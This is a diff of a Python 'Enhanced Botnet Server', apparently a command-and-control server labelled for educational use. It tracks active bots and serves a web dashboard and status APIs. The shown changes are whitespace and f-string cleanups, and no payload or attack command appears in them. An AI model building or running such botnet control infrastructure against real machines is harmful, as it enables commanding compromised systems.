@@ -30,7 +30,7 @@ try:
     from aiohttp import web
     import aiohttp_cors
     AIOHTTP_AVAILABLE = True
-    
+
     # Type aliases for when aiohttp is available
     WebRequest = web.Request
     WebResponse = web.Response
@@ -38,7 +38,7 @@ except ImportError:
     AIOHTTP_AVAILABLE = False
     print("Warning: aiohttp not installed. Web dashboard will be disabled.")
     print("Install with: pip install aiohttp aiohttp-cors")
-    
+
     # Dummy types for when aiohttp is not available
     WebRequest = Any
     WebResponse = Any
@@ -147,7 +147,7 @@ class EnhancedBotnetServer:
             else:
                 self.logger.warning("Web dashboard disabled: aiohttp not installed")
             return
-        
+
         self.web_app = web.Application()
 
         # Setup CORS
@@ -179,7 +179,7 @@ class EnhancedBotnetServer:
         """Serve the cyberpunk dashboard HTML."""
         if not AIOHTTP_AVAILABLE:
             return None
-        
+
         try:
             dashboard_path = Path(__file__).parent / "dashboard.html"
             if dashboard_path.exists():
@@ -196,7 +196,7 @@ class EnhancedBotnetServer:
         """API endpoint for server status."""
         if not AIOHTTP_AVAILABLE:
             return None
-        
+
         try:
             active_bots = self.bot_tracker.get_active_bots()
             status_data = {
@@ -226,7 +226,7 @@ class EnhancedBotnetServer:
         """API endpoint for bot information."""
         if not AIOHTTP_AVAILABLE:
             return None
-        
+
         try:
             active_bots = self.bot_tracker.get_active_bots()
             return web.json_response({"bots": active_bots})
@@ -238,7 +238,7 @@ class EnhancedBotnetServer:
         """API endpoint for detailed statistics."""
         if not AIOHTTP_AVAILABLE:
             return None
-        
+
         try:
             stats_data = self.get_server_stats()
             return web.json_response(stats_data)
@@ -601,7 +601,7 @@ class EnhancedBotnetServer:
             # Setup web server first (if available and not disabled)
             if AIOHTTP_AVAILABLE and not self.disable_dashboard:
                 await self.setup_web_server()
-                
+
                 # Start web server
                 if self.web_app:
                     self.web_runner = web.AppRunner(self.web_app)
@@ -647,22 +647,22 @@ class EnhancedBotnetServer:
             if e.errno == 98 or e.errno == 48:  # Address already in use
                 self.logger.error(f"Port {self.port} is already in use")
                 print(f"\n❌ Error: Port {self.port} is already in use", file=sys.stderr)
-                print(f"Tip: Try a different port with: --port <number>", file=sys.stderr)
-                print(f"     Or find what's using the port:", file=sys.stderr)
+                print("Tip: Try a different port with: --port <number>", file=sys.stderr)
+                print("     Or find what's using the port:", file=sys.stderr)
                 print(f"       Linux/macOS: lsof -i :{self.port}", file=sys.stderr)
                 print(f"       Windows: netstat -ano | findstr :{self.port}", file=sys.stderr)
             elif e.errno == 13:  # Permission denied
                 self.logger.error(f"Permission denied for port {self.port}")
                 print(f"\n❌ Error: Permission denied for port {self.port}", file=sys.stderr)
-                print(f"Tip: Ports below 1024 require root/admin privileges", file=sys.stderr)
-                print(f"     Use a port above 1024 (e.g., 9999) or run as root", file=sys.stderr)
+                print("Tip: Ports below 1024 require root/admin privileges", file=sys.stderr)
+                print("     Use a port above 1024 (e.g., 9999) or run as root", file=sys.stderr)
             else:
                 self.logger.error(f"Failed to start enhanced server: {str(e)}")
                 print(f"\n❌ Error: Failed to start server: {str(e)}", file=sys.stderr)
         except Exception as e:
             self.logger.error(f"Failed to start enhanced server: {str(e)}")
             print(f"\n❌ Error: Failed to start server: {str(e)}", file=sys.stderr)
-            print(f"Tip: Run with --verbose flag for detailed error information", file=sys.stderr)
+            print("Tip: Run with --verbose flag for detailed error information", file=sys.stderr)
         finally:
             if "monitor_task" in locals():
                 monitor_task.cancel()
@@ -781,117 +781,117 @@ Environment Variables:
   BOTNET_LOG_LEVEL        Logging level (DEBUG, INFO, WARNING, ERROR)
         """
     )
-    
+
     parser.add_argument(
         '--version',
         action='version',
         version='Enhanced Botnet Server v2.0'
     )
-    
+
     parser.add_argument(
         '--host',
         type=str,
         help='Server bind address (default: from config or env)'
     )
-    
+
     parser.add_argument(
         '--port',
         type=int,
         help='Server port number (default: from config or env)'
     )
-    
+
     parser.add_argument(
         '--web-port',
         type=int,
         help='Web dashboard port (default: 8080)'
     )
-    
+
     parser.add_argument(
         '--config',
         type=str,
         help='Path to configuration file'
     )
-    
+
     parser.add_argument(
         '--verbose', '-v',
         action='store_true',
         help='Enable verbose (DEBUG) logging'
     )
-    
+
     parser.add_argument(
         '--quiet', '-q',
         action='store_true',
         help='Minimize logging output (WARNING level only)'
     )
-    
+
     parser.add_argument(
         '--max-connections',
         type=int,
         help='Maximum concurrent connections (default: 100)'
     )
-    
+
     parser.add_argument(
         '--no-dashboard',
         action='store_true',
         help='Disable web dashboard even if aiohttp is available'
     )
-    
+
     return parser.parse_args()
 
 
 async def main():
     """Main entry point for the enhanced botnet server."""
     import os
-    
+
     args = parse_arguments()
-    
+
     # Override environment variables with command-line arguments
     if args.host:
         os.environ['BOTNET_HOST'] = args.host
-    
+
     if args.port:
         os.environ['BOTNET_PORT'] = str(args.port)
-    
+
     if args.web_port:
         os.environ['BOTNET_WEB_PORT'] = str(args.web_port)
-    
+
     if args.verbose:
         os.environ['BOTNET_LOG_LEVEL'] = 'DEBUG'
     elif args.quiet:
         os.environ['BOTNET_LOG_LEVEL'] = 'WARNING'
-    
+
     if args.max_connections:
         os.environ['BOTNET_MAX_CONNECTIONS'] = str(args.max_connections)
-    
+
     # Create server with dashboard disable flag
     server = EnhancedBotnetServer(
         config_file=args.config,
         disable_dashboard=args.no_dashboard
     )
-    
+
     # Display startup information
     print("=" * 60)
     print("Enhanced Botnet Server v2.0")
     print("Educational/Research Use Only")
     print("=" * 60)
     print(f"Main Server: {server.host}:{server.port}")
-    
+
     dashboard_enabled = AIOHTTP_AVAILABLE and not args.no_dashboard
-    print(f"Web Dashboard: {server.host}:{server.web_port} " + 
+    print(f"Web Dashboard: {server.host}:{server.web_port} " +
           ("(Enabled)" if dashboard_enabled else "(Disabled)"))
-    
+
     print(f"Max Connections: {server.max_connections}")
     print(f"TLS: {'Enabled' if server.ssl_context else 'Disabled'}")
     print(f"Log Level: {server.config.get('LOG_LEVEL', 'INFO')}")
     print("=" * 60)
-    
+
     if dashboard_enabled:
         print(f"Dashboard URL: http://{server.host}:{server.web_port}")
         print("=" * 60)
-    
+
     print("Press Ctrl+C to stop the server")
     print("=" * 60)
-    
+
     await server.start_server()
 
 
